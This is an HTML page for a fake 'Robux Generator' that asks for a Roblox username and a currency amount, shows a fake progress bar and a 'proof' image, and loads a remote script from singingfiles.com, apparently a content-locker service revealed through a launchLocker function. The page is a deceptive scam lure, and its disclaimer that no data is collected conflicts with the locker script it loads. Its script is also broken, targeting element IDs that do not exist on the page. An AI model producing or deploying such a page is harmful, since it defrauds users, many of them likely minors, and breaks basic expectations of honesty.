<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Robux Generator</title>

  <style>
    /* ----------- MISE EN PAGE ORIGINALE ----------- */
    body {
      margin: 0;
      font-family: Arial, Helvetica, sans-serif;
      background: url("background.png") no-repeat center/cover fixed;
      color: #fff;
      text-align: center;
    }

    .header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 20px 40px;
    }

    .logo {
      display: flex;
      align-items: center;
      font-size: 20px;
      font-weight: bold;
    }

    .logo img {
      width: 25px;
      height: 25px;
      margin-left: 10px;
    }

    .avatar {
      width: 80px;
    }

    .main-title {
      font-size: 7vw;
      font-weight: 800;
      margin: 100px 0 60px;
    }

    .form-container {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 20px;
      margin-bottom: 40px;
    }

    input,
    select,
    button {
      border: none;
      padding: 15px 25px;
      border-radius: 30px;
      font-size: 16px;
      font-weight: bold;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
      cursor: pointer;
    }

    input,
    select {
      background: #f1f1f1;
      color: #333;
      width: 250px;
      text-align: center;
    }

    button {
      background: linear-gradient(90deg, #7a00ff, #ff005e);
      color: #fff;
      transition: 0.2s;
    }

    button:hover {
      transform: scale(1.05);
    }

    .loading-container {
      display: none;
      flex-direction: column;
      align-items: center;
      margin-top: 30px;
    }

    #loadingBarBox {
      width: 80%;
      max-width: 400px;
      height: 20px;
      background: rgba(255, 255, 255, 0.2);
      border-radius: 10px;
      overflow: hidden;
    }

    #loadingBar {
      width: 0;
      height: 100%;
      background: #00ff90;
      transition: width 0.3s;
    }

    .proof-image {
      margin-top: 40px;
    }

    .proof-image img {
      width: 200px;
    }

    #statusText {
      margin-top: 20px;
      font-size: 18px;
    }

    #robuxCount {
      font-weight: bold;
      color: #00ff90;
      font-size: 22px;
    }

    /* ----------- RÃ‰ACTIF ----------- */
    @media (max-width: 600px) {
      .main-title {
        font-size: 8vw;
        margin-top: 60px;
      }

      input,
      select,
      button {
        width: 80%;
        padding: 12px;
      }

      .header {
        flex-direction: column;
        padding: 10px;
        gap: 10px;
      }

      .avatar {
        width: 60px;
      }

      .proof-image img {
        width: 80%;
      }

      #statusText {
        font-size: 16px;
      }
    }
  </style>
</head>
<body>

  <!-- HEADER -->
  <div class="header">
    <div class="logo">Robux Generator <img src="logo.png" alt="Logo"></div>
    <img src="avatar.gif" class="avatar" alt="Avatar">
  </div>

  <!-- TITRE -->
  <div class="main-title">
    Generate robux<br>now on your<br>Roblox account
  </div>

  <!-- FORMULAIRE -->
  <div class="form-container">
    <input id="username" type="text" placeholder="Enter your username">
    <select id="amount">
      <option selected disabled>Choose robux amount</option>
      <option>250</option><option>1000</option><option>2500</option><option>10000</option>
    </select>
    <button id="generateBtn">Click to generate!</button>
  </div>

  <!-- CHARGEMENT -->
  <div id="loadingContainer" class="loading-container">
    <div id="loadingBarBox"><div id="loadingBar"></div></div>
    <div id="statusText"></div>
  </div>

  <!-- PREUVE -->
  <div class="proof-image"><img src="proof.png" alt="Robux Proof"></div>

  <!-- DISCLAIMER -->
  <p style="font-size:.75rem;opacity:.5">This is not a real generator. No data is collected.</p>

  <!-- SCRIPT PRINCIPAL -->
  <script type="text/javascript" src="https://singingfiles.com/script_include.php?id=1821663"></script>

  <script>
    function startGeneration() {
      const username = document.getElementById("username").value.trim();
      if (username === "") {
        alert("Please enter your Roblox username.");
        return;
      }

      // Cacher contenu principal
      document.getElementById("loading").style.display = "block";

      const progress = document.getElementById("progress-fill");
      let percent = 0;
      const interval = setInterval(() => {
        percent += 1;
        progress.style.width = percent + "%";

        if (percent >= 100) {
          clearInterval(interval);
          launchLocker();
        }
      }, 50);
    }

    function launchLocker() {
      document.getElementById("main-content").style.display = "none";
      document.getElementById("locker-container").style.display = "block";
    }
  </script>
</body>
</html>
